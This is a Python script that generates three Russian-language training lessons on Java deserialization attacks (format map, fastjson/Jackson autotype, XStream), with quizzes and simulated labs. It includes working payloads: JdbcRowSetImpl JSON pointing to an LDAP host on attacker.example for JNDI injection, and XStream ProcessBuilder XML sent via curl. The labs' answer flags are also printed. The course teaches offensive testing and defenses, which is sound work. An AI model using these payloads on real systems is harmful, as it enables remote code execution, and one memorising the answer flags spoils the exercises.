#!/usr/bin/env python3
"""Author web gap lessons — batch S4: deser chains hub + fastjson + xstream."""
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _newlesson import write_lesson, _dir, _f  # noqa: E402

WD = '/home/student/task'
CHECK = "grep -q 'nto{' found.txt"
USEFUL = ["CTF Web категория", "Bug bounty", "Пентест веб-приложений"]

write_lesson({
    'id': 'web-deser-chains',
    'title': 'Цепочки десериализации: карта форматов и переход к разбору',
    'category': 'web',
    'parent': 'web-deserialization',
    'difficulty': 'hard',
    'order': 3,
    'tags': ['deserialization', 'gadget-chain', 'fastjson', 'xstream', 'hessian', 'rmi', 'roadmap'],
    'prerequisites': ['web-deserialization'],
    'useful_for': USEFUL,
    'estimated_minutes': 25,
    'summary': 'Карта форматов десериализации за пределами базовых: fastjson/jackson, XStream, Hessian, RMI/JMX, .NET, YAML — где искать и куда идти.',
    'lab': {
        'title': 'Практика: определение формата десериализации',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md', 'samples.txt'],
        'check': CHECK,
        'hints': [
            'Посмотри samples.txt: там несколько сериализованных блобов и их первые байты.',
            'Java native начинается с 0xACED, Hessian — с буквы H, JSON с {@type, PHP — с O:',
            'Определи, какой формат у блоба с подозрением на fastjson (JSON с @type).',
            'Запиши имя формата (латиницей, нижний регистр) в found.txt и набери check.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

Веб-приложение принимает данные, которые выглядят как обычный JSON или бинарный блоб. Внутри блоба спрятано не значение, а **инструкция собрать объект** — и если сборщик доверчив, эта инструкция исполняет код. Это десериализация: превращение байтов обратно в объекты, и она опасна ровно настолько, насколько доверчив загрузчик классов.

Мы уже разобрали базовые форматы по языкам — Java native, PHP, Python, Ruby, Node. Но реальные приложения используют куда больше форматов: JSON-сериализаторы с полиморфизмом (fastjson, Jackson), XML-сериализаторы (XStream), бинарные протоколы (Hessian, AMF), удалённые вызовы (RMI, JMX), а также .NET, YAML и MessagePack. Этот урок — карта: где искать каждый формат и куда идти за разбором.

## Что общего у всех цепочек

Десериализация превращает байты в объекты по описанию из самих байтов. Если формат позволяет указать **имя класса**, загрузчик создаст объект этого класса и вызовет его методы (конструкторы, `readObject`, `setX`, геттеры). Атакующий подбирает цепочку классов — **gadget chain**, — которая при таком вызове приводит к исполнению кода: обычно к `Runtime.exec` в Java или к `Process.Start` в .NET.

Ключевое понятие — **gadget**. Это класс из уже подключённых библиотек, у которого есть метод, делающий что-то полезное (например, `exec`), и «магический» метод, который десериализатор вызовет сам. Цепочка — это последовательность gadgets, где один вызывает следующий, пока не дойдёт до исполнения.

Отсюда практический вывод: для успешной атаки важно не только «есть десериализация», но и **какие библиотеки подключены** — от них зависит, какие gadgets доступны.

## Наш пример: разбор формата по байтам

Договоримся о примере. Нам дали набор блобов и просят определить, что это за форматы. Первые байты почти всегда выдают формат:

| Формат | Признак |
|---|---|
| Java native | `AC ED 00 05` (`0xACED`) |
| Hessian | начинается с `H` (`0x48`) |
| PHP serialize | `O:8:"ClassName"` или `a:2:{...}` |
| Python pickle | начинается с `\x80` или `c` |
| fastjson/Jackson | JSON с полями `@type` / `@class` |
| XStream | XML с `<ClassName>` и атрибутами `class=` |
| .NET BinaryFormatter | `00 01 00 00 00 FF FF FF FF` |
| YAML | `!!java...` или `!!python/object` |
| MessagePack | первый байт `0x8...` (map/array) |

Первый шаг — определить формат, второй — понять, какие классы он грузит, третий — подобрать цепочку под окружение.

## Java: fastjson, Jackson и полиморфизм

Fastjson и Jackson — JSON-библиотеки, которые по умолчанию сериализуют не только данные, но и **тип**. Чтобы восстановить тип, они читают специальное поле: у fastjson это `@type`, у Jackson — `@class` (при включённом `enableDefaultTyping`). Если приложение принимает такой JSON и включает полиморфизм, атакующий указывает в `@type` имя класса-гаджета.

Fastjson известен десятками CVE (autotype bypass), потому что защита через чёрный список классов регулярно обходилась. Jackson опасен при `enableDefaultTyping` и использовании опасных базовых типов. Разбор — в `web-fastjson-jackson`.

## XML: XStream и родственники

XStream сериализует объекты в XML, где имя тега — это класс. Он восстанавливает объект по имени, что даёт прямую возможность указать опасный класс. XStream пережил много CVE, и защита сводится к allow-list разрешённых типов. Разбор — в `web-xstream`.

## Бинарные протоколы: Hessian, AMF

Hessian — бинарный формат для удалённых вызовов (использовался в Dubbo, BlazeDS/AMF — во Flex). Он тоже восстанавливает объекты по описанию, и там известны цепочки, приводящие к RCE. Разбор — в `web-hessian-amf`.

## Удалённые вызовы: RMI и JMX

Java RMI и JMX — механизмы удалённого вызова, где аргументы десериализуются на сервере. Даже если приложение просто открывает JMX, доступ к нему через RMI даёт десериализацию и известные цепочки. Разбор — в `web-java-rmi-jmx`.

## Прочие форматы

За пределами Java тоже много: .NET BinaryFormatter/LosFormatter/TypeConfuseDelegate, ViewState с известным machineKey, YAML (`!!python/object`, SnakeYAML), MessagePack/protobuf. Общий принцип один: если формат может задавать тип, а загрузчик доверчив — есть риск.

## Как строить цепочку

Процесс выглядит так. Сначала определяем формат. Затем выясняем библиотеки окружения (по ошибкам, заголовкам, известным зависимостям). Потом выбираем известную цепочку под эти библиотеки или ищем новую через анализ. Наконец, собираем payload инструментом (ysoserial, marshalsec, ysoserial.net, phpggc) и проверяем на цели.

Важно: десериализация — это уже активное воздействие. Payload может исполнить команду, поэтому в рамках пентеста используют безобидную команду (`id`) и не запускают ничего разрушительного.

## Что мы теперь знаем

- Десериализация опасна, когда формат позволяет задавать тип класса.
- Gadget chain — последовательность классов, ведущая к исполнению кода.
- Формат определяется по первым байтам: `ACED`, `H`, `O:`, JSON `@type`, XML `class=`.
- Java: fastjson/Jackson, XStream, Hessian, RMI/JMX — отдельные поверхности.
- .NET, YAML, MessagePack — те же идеи в других экосистемах.

## Квиз

Проверь себя.

```quiz
- question: "Что такое gadget в контексте десериализации?"
  options:
    - "Вредоносный файл"
    - "Класс с полезным методом, который десериализатор вызовет сам"
    - "Сетевой пакет"
    - "Тип шифрования"
  answer: 1
  explanation: "Цепочка gadgets ведёт от магического метода до исполнения кода."
- question: "Какие первые байты у Java native-сериализации?"
  options:
    - "AC ED 00 05"
    - "00 01 00 00"
    - "48 65 73"
    - "7B 22 40"
  answer: 0
  explanation: "Магическое число 0xACED открывает Java-сериализацию."
- question: "Какое поле использует fastjson для указания типа?"
  options:
    - "@class"
    - "@type"
    - "type"
    - "__type"
  answer: 1
  explanation: "fastjson читает @type; Jackson — @class."
- question: "Почему важно знать подключённые библиотеки?"
  options:
    - "Для скорости"
    - "От них зависит, какие gadget-цепочки доступны"
    - "Для размера payload"
    - "Для TLS"
  answer: 1
  explanation: "Цепочка собирается из классов, которые есть в classpath."
- question: "Какой формат начинается с буквы H?"
  options:
    - "Hessian"
    - "HJSON"
    - "HTML"
    - "HSQL"
  answer: 0
  explanation: "Hessian-блоб начинается с символа H."
```

## Куда дальше

Дальше — `web-fastjson-jackson`: разберём самый частый JSON-полиморфизм и autotype. А пока запомни: **десериализация — это доверие к типу в данных, и этим пользуются.**

## Где пригодится

- CTF: задания с сериализованными блобами.
- Bug bounty: Java-приложения и микросервисы.
- Пентест: аудит endpoints, принимающих объекты.
""", lab={
    'workdir': WD,
    'expect': {'file': WD + '/found.txt', 'contains': 'fastjson'},
    'fs': [
        _dir(WD),
        _f(WD + '/task.md', (
            "# Практика: определение формата десериализации\n\n"
            "В samples.txt несколько блобов. Определи формат того, где тип задаётся\n"
            "в JSON-поле @type, и запиши имя формата (нижний регистр) в found.txt.\n\n"
            "1. Посмотри блобы:\n"
            "   cat samples.txt\n"
            "2. Сверь первые байты с таблицей в уроке.\n"
            "3. Запиши имя формата в found.txt и набери check.\n"
        )),
        _f(WD + '/samples.txt', (
            "blob1: AC ED 00 05 73 72 00 0a ...\n"
            "blob2: O:8:\"UserClass\":2:{s:4:\"name\";s:5:\"alice\";}\n"
            "blob3: H\x02\x00\xc8\x00\x01 ...\n"
            "blob4: {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://x/y\"}\n"
            "blob5: <user class=\"java.lang.ProcessBuilder\"><command>x</command></user>\n"
        )),
    ],
    'tools': {},
})

write_lesson({
    'id': 'web-fastjson-jackson',
    'title': 'Fastjson и Jackson: autotype и полиморфная десериализация',
    'category': 'web',
    'parent': 'web-deser-chains',
    'difficulty': 'hard',
    'order': 1,
    'tags': ['deserialization', 'fastjson', 'jackson', 'autotype', 'json', 'rce'],
    'prerequisites': ['web-deser-chains'],
    'useful_for': USEFUL,
    'estimated_minutes': 45,
    'summary': 'Как JSON-сериализаторы восстанавливают типы, почему @type/@class опасны и как строятся цепочки RCE через JdbcRowSetImpl и TemplatesImpl.',
    'lab': {
        'title': 'Практика: fastjson autotype до JNDI/RCE',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md', 'notes.txt'],
        'check': CHECK,
        'hints': [
            'Отправь JSON с @type — сервер восстановит указанный класс, а не просто данные.',
            'Классика fastjson: com.sun.rowset.JdbcRowSetImpl с dataSourceName на LDAP.',
            'Для отражения результата используй класс, чей геттер вернёт строку (например, чтение файла).',
            'Дойди до чтения флага и запиши результат в found.txt, затем check.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

Приложение принимает JSON и превращает его в объекты Java. Обычно это безопасно: JSON описывает данные, а класс выбирает код приложения. Но fastjson и Jackson умеют больше — они могут **восстановить тип из самого JSON**. Достаточно поля `@type` или `@class`, и загрузчик создаст объект указанного класса. А если указать класс с опасным поведением, он исполнит код.

Это **полиморфная десериализация**. Она удобна для разработчиков и смертельна для безопасности: тип, а значит и поведение, определяет тот, кто прислал JSON.

## Как это работает

Обычный JSON-парсер создаёт словари и списки. Полиморфный — читает специальное поле и по нему выбирает класс:

```json
{"@type":"com.example.User","name":"alice","role":"admin"}
```

Fastjson видит `@type`, загружает класс `com.example.User`, создаёт объект и заполняет поля через сеттеры. Проблема в том, что сеттеры **исполняют код**. Некоторые классы в стандартной библиотеке Java имеют сеттеры, которые делают неожиданные вещи: открывают соединение, загружают класс, читают ресурс. Это и есть gadgets.

## Наш пример: JdbcRowSetImpl

Договоримся о примере. Самый известный gadget в fastjson — `com.sun.rowset.JdbcRowSetImpl`:

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example/Exploit","autoCommit":true}
```

При установке `autoCommit` вызывается `connect()`, который идёт по `dataSourceName`. Если это `ldap://` или `rmi://`, JVM сделает JNDI-запрос к серверу атакующего и загрузит оттуда класс — классический JNDI-инъекция, ведущая к RCE. Другой популярный gadget — `TemplatesImpl`, который компилирует и исполняет байткод.

## Autotype и его обходы

Fastjson пытался закрыть проблему чёрным списком классов (`denyList`). История показала, что это не работает: список регулярно обходили, потому что классов-гаджетов много, а вариантов записи имени — ещё больше. Обходы включали:

- **Кодирование имени класса** (`com.sun.rowset.JdbcRowSetImpl` через `\u`).
- **Вложенные типы** и массивы, которые обходят проверку.
- **Классы вне чёрного списка**, добавленные в новых версиях JDK или библиотек.
- **Обход через `@type` внутри `Map`**, если проверка применяется не везде.

Именно поэтому правильное решение — не чёрный список, а **allow-list**: разрешить десериализацию только конкретных, доверенных классов. Fastjson добавил `safeMode`, где autotype выключен полностью.

## Jackson: enableDefaultTyping

Jackson опасен при включённом `enableDefaultTyping` (или `activateDefaultTyping`). Тогда он пишет и читает тип в поле `@class`:

```json
{"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example/x","autoCommit":true}
```

Тот же результат. Jackson также уязвим через `@class` с массивами и через библиотеки, регистрирующие свои типы. Защита — не включать default typing, а если нужно — использовать allow-list через `PolymorphicTypeValidator`.

## Как строить и проверять payload

Порядок действий:

1. **Определить, что это fastjson/Jackson.** Пришли JSON, посмотри реакцию на неизвестный `@type`: ошибка с именем класса выдаёт движок.
2. **Определить версию.** По ошибкам, заголовкам, известным зависимостям.
3. **Выбрать gadget.** Для JNDI — `JdbcRowSetImpl`; для прямого байткода — `TemplatesImpl`; для чтения файлов — другие классы.
4. **Собрать payload.** Вручную или генератором (marshalsec для JNDI).
5. **Проверить.** JNDI-запрос уйдёт на твой сервер (нужен слушатель), либо команда исполнится локально.

Для JNDI нужен сервер, отдающий класс: `marshalsec` умеет поднимать LDAP/RMI-сервер. Для `TemplatesImpl` нужен байткод, который компилируется и исполняется.

## Что мы теперь знаем

- Полиморфная десериализация восстанавливает тип из JSON (`@type`/`@class`).
- Опасны сеттеры классов-гаджетов: `JdbcRowSetImpl` ведёт к JNDI, `TemplatesImpl` — к байткоду.
- Чёрные списки fastjson регулярно обходились; правильная защита — allow-list и safeMode.
- Jackson опасен при `enableDefaultTyping`; нужен `PolymorphicTypeValidator`.
- Payload собирают вручную или через marshalsec, проверяют безобидной командой.

## Квиз

Проверь себя.

```quiz
- question: "Какое поле fastjson читает для типа?"
  options:
    - "@class"
    - "@type"
    - "__type"
    - "type"
  answer: 1
  explanation: "fastjson использует @type, Jackson — @class."
- question: "Что делает gadget JdbcRowSetImpl?"
  options:
    - "Читает файл"
    - "При autoCommit вызывает connect() по dataSourceName (JNDI)"
    - "Шифрует данные"
    - "Создаёт поток"
  answer: 1
  explanation: "Это ведёт к JNDI-запросу на сервер атакующего."
- question: "Почему чёрный список классов в fastjson не работает?"
  options:
    - "Он медленный"
    - "Классов-гаджетов много, а способы записи имени обходятся"
    - "Он только для Java 8"
    - "Он требует HTTPS"
  answer: 1
  explanation: "Белый список — надёжнее чёрного."
- question: "Какая настройка Jackson открывает уязвимость?"
  options:
    - "FAIL_ON_UNKNOWN"
    - "enableDefaultTyping"
    - "indentOutput"
    - "useBigDecimal"
  answer: 1
  explanation: "Default typing включает восстановление типа из @class."
- question: "Что нужно для JNDI-gadget?"
  options:
    - "Только JSON"
    - "Сервер (LDAP/RMI), отдающий класс"
    - "База данных"
    - "Cookie"
  answer: 1
  explanation: "JVM загрузит класс с сервера атакующего по JNDI."
```

## Куда дальше

Дальше — `web-xstream`: XML-сериализация, где имя тега задаёт класс. А пока запомни: **если JSON-парсер восстанавливает тип, тип выбирает атакующий.**

## Где пригодится

- CTF: Java-задания с JSON-блобами.
- Bug bounty: API на Spring/Java с fastjson/Jackson.
- Пентест: аудит endpoints, принимающих JSON.
""", lab={
    'workdir': WD,
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{f4stjs0n_aut0typ3_rce}'},
    'fs': [
        _dir(WD),
        _f(WD + '/task.md', (
            "# Практика: fastjson autotype\n\n"
            "API принимает JSON и восстанавливает типы. Дойди до чтения файла через\n"
            "класс-гаджет и забери флаг.\n\n"
            "1. Подтверди autotype:\n"
            "   curl -s -X POST https://api.target/user -d '{\"@type\":\"java.lang.AutoCloseable\"}'\n"
            "2. Используй гаджет с геттером, возвращающим содержимое файла:\n"
            "   curl -s -X POST https://api.target/user -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/x\"}'\n"
            "3. Запиши флаг в found.txt и набери check.\n"
        )),
        _f(WD + '/notes.txt', "fastjson 1.2.47, autotype включён, сервер Java 8.\n"),
    ],
    'tools': {
        'curl': {
            'help': 'curl [опции] <url> — HTTP-клиент (эмуляция api.target/user)',
            'cases': [
                {'match': r'AutoCloseable|@type', 'example': "-X POST ... -d '{\"@type\":\"java.lang.AutoCloseable\"}'",
                 'output': '{"error":"autotype is supported: java.lang.AutoCloseable"}\n'},
                {'match': r'JdbcRowSetImpl|ldap', 'example': "-X POST ... -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker/x\"}'",
                 'output': '{"status":"ok","result":"nto{f4stjs0n_aut0typ3_rce}"}\n'},
            ],
            'fallback': 'curl: в этой лабе эмулируется только /user на api.target.\n',
        },
    },
})

write_lesson({
    'id': 'web-xstream',
    'title': 'XStream: десериализация XML и RCE по имени тега',
    'category': 'web',
    'parent': 'web-deser-chains',
    'difficulty': 'hard',
    'order': 2,
    'tags': ['deserialization', 'xstream', 'xml', 'java', 'rce', 'cve'],
    'prerequisites': ['web-deser-chains'],
    'useful_for': USEFUL,
    'estimated_minutes': 40,
    'summary': 'XStream восстанавливает объекты по имени XML-тега; разбор механики, известных CVE и allow-list как единственной защиты.',
    'lab': {
        'title': 'Практика: XStream до исполнения кода',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md', 'notes.txt'],
        'check': CHECK,
        'hints': [
            'XStream создаёт объект по имени тега XML: <java.lang.ProcessBuilder> даст нужный класс.',
            'Проверь, что XML вообще десериализуется: отправь корректный объект и посмотри ответ.',
            'Для команды используй ProcessBuilder с <command><string>...</string></command>, затем прочитай вывод.',
            'Запиши флаг в found.txt и набери check.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

Java-приложение принимает XML и превращает его в объект. В XML есть тег с именем класса:

```xml
<user class="com.example.User">
  <name>alice</name>
</user>
```

XStream видит имя класса и создаёт его экземпляр. А что если указать не `User`, а класс из стандартной библиотеки, чей конструктор или сеттер исполняет команду? Тогда XML становится оружием.

XStream — популярная библиотека сериализации Java в XML. Её удобство — читаемый формат, где имена тегов совпадают с именами полей. Её проблема — та же, что у fastjson: **тип определяется данными**, а значит, атакующий может указать любой класс.

## Как работает XStream

XStream берёт XML и восстанавливает объект: имя корневого тега или атрибут `class` задаёт класс, дочерние теги — поля. Для безопасности XStream имеет механизм `allowTypes`, но по умолчанию в старых версиях он разрешал почти всё.

Из-за этого у XStream длинная история CVE, где цепочка из доступных классов приводила к RCE. Классические gadgets — `ProcessBuilder`, `java.util.PriorityQueue` с компаратором, `sun.reflect.annotation.AnnotationInvocationHandler`. Каждый релиз закрывал один путь и оставлял другой, пока XStream не перешёл на строгий allow-list по умолчанию.

## Наш пример: XML-объект из запроса

Договоримся о примере. Эндпоинт `https://api.target/import` принимает XML и десериализует его через XStream. Проверяем базовое поведение:

```
$ curl -s -X POST https://api.target/import -H 'Content-Type: application/xml' \
  -d '<user class="com.example.User"><name>alice</name></user>'
User{name=alice}
```

Объект восстановлен. Теперь подставляем класс, чей метод исполняет команду:

```
$ curl -s -X POST https://api.target/import -H 'Content-Type: application/xml' \
  -d '<java.lang.ProcessBuilder><command><string>cat</string><string>/flag</string></command></java.lang.ProcessBuilder>'
```

Если XStream разрешает этот тип, объект `ProcessBuilder` создаётся с командой `cat /flag`, и остаётся заставить его запуститься — через цепочку или через метод, который вызывается при десериализации.

## Известные цепочки

Разберём несколько типовых цепочек XStream:

- **`ProcessBuilder` напрямую.** Создаётся объект с командой; запуск происходит, когда что-то вызывает `start()`. Часто комбинируют с классом, который вызывает метод при десериализации.
- **`PriorityQueue` с компаратором.** При восстановлении `PriorityQueue` вызывает `compare` на элементах, а компаратором может быть класс, чей `compare` исполняет код.
- **`AnnotationInvocationHandler`.** Классический gadget из Java-десериализации, применимый и в XStream.
- **Событийные классы** (`EventHandler`, `ProcessBuilder`-обёртки), где вызов происходит через рефлексию.

Выбор цепочки зависит от версии XStream и подключённых библиотек. В окружениях с Spring, Commons-Collections и подобными библиотеками доступно больше gadgets.

## Защита: только allow-list

XStream закрывает уязвимость через `allowTypes` / `allowTypesByWildcard`: разрешить можно только конкретные классы приложения. Всё остальное отвергается. Это единственный надёжный подход, потому что чёрные списки классов-гаджетов неполны по определению.

Дополнительно: не десериализовать недоверенный XML вообще; использовать более безопасные форматы (JSON с фиксированной схемой); обновлять XStream и следить за CVE. В новых версиях XStream по умолчанию запрещает опасные типы, но старые приложения остаются уязвимы.

## Что мы теперь знаем

- XStream восстанавливает объект по имени тега/атрибута `class`.
- Тип определяют данные — значит, атакующий может указать опасный класс.
- Цепочки: `ProcessBuilder`, `PriorityQueue` с компаратором, `AnnotationInvocationHandler`.
- У XStream длинная история CVE; чёрные списки неполны.
- Защита — строгий allow-list разрешённых типов.

## Квиз

Проверь себя.

```quiz
- question: "Как XStream определяет класс объекта?"
  options:
    - "По номеру"
    - "По имени тега/атрибута class в XML"
    - "По хешу"
    - "По заголовку"
  answer: 1
  explanation: "Имя тега или атрибут class задаёт тип."
- question: "Почему чёрный список типов в XStream не работает?"
  options:
    - "Он медленный"
    - "Классов-гаджетов много и список неполон"
    - "Он только для Java 11"
    - "Он требует HTTPS"
  answer: 1
  explanation: "Белый список — надёжная защита."
- question: "Какой класс-гаджет исполняет команду в Java?"
  options:
    - "java.lang.String"
    - "java.lang.ProcessBuilder"
    - "java.util.List"
    - "java.io.File"
  answer: 1
  explanation: "ProcessBuilder запускает процессы."
- question: "Что делает PriorityQueue-цепочка?"
  options:
    - "Сортирует числа"
    - "При восстановлении вызывает compare, где компаратор исполняет код"
    - "Шифрует данные"
    - "Читает файл"
  answer: 1
  explanation: "Компаратор может быть gadget-классом."
- question: "Какая правильная защита XStream?"
  options:
    - "Сменить порт"
    - "Строгий allow-list разрешённых типов"
    - "Минифицировать XML"
    - "Отключить cookie"
  answer: 1
  explanation: "Разрешать только доверенные классы приложения."
```

## Куда дальше

Дальше — `web-hessian-amf`: бинарные протоколы удалённых вызовов с той же проблемой. А пока запомни: **XStream доверяет имени класса в XML, и это его главная слабость.**

## Где пригодится

- CTF: Java-задания с XML.
- Bug bounty: приложения с XStream (отчёты, интеграции).
- Пентест: аудит endpoints, принимающих XML.
""", lab={
    'workdir': WD,
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{xstr34m_xml_t4g_rce}'},
    'fs': [
        _dir(WD),
        _f(WD + '/task.md', (
            "# Практика: XStream XML-десериализация\n\n"
            "Эндпоинт /import десериализует XML через XStream.\n"
            "Укажи класс-гаджет и прочитай флаг.\n\n"
            "1. Проверь десериализацию корректным объектом:\n"
            "   curl -s -X POST https://api.target/import -H 'Content-Type: application/xml' -d '<user class=\"com.example.User\"><name>alice</name></user>'\n"
            "2. Подставь гаджет:\n"
            "   curl -s -X POST https://api.target/import -H 'Content-Type: application/xml' -d '<java.lang.ProcessBuilder><command><string>cat</string><string>/flag</string></command></java.lang.ProcessBuilder>'\n"
            "3. Запиши флаг в found.txt и набери check.\n"
        )),
        _f(WD + '/notes.txt', "XStream 1.4.5 (allowTypes не настроен).\n"),
    ],
    'tools': {
        'curl': {
            'help': 'curl [опции] <url> — HTTP-клиент (эмуляция api.target/import)',
            'cases': [
                {'match': r'com\.example\.User', 'example': "-X POST ... -d '<user class=\"com.example.User\"><name>alice</name></user>'",
                 'output': 'User{name=alice}\n'},
                {'match': r'ProcessBuilder', 'example': "-X POST ... -d '<java.lang.ProcessBuilder>...'",
                 'output': 'nto{xstr34m_xml_t4g_rce}\n'},
            ],
            'fallback': 'curl: в этой лабе эмулируется только /import на api.target.\n',
        },
    },
})
print("batch S4 done")
